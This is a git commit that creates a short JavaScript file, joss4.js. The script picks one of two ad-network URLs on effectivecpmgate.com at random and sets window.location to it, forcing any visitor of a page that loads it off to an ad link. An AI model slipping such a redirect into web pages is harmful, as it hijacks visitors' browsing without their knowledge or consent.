8a43b8ad6a9a154a6bbfe76ab040a83336609201
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-09-07 10:17:44 +0800

    Create joss4.js

---
+++ joss4.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+  
+  'https://www.effectivecpmgate.com/hd8pzzdktj?key=ed4ea6cf3942fb996e79906e1c59a64d',
+  'https://www.effectivecpmgate.com/tykpbwuirx?key=2bd2cc016f846e31eba9c90b01a4ed2d'
+ 
+  
+  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
+
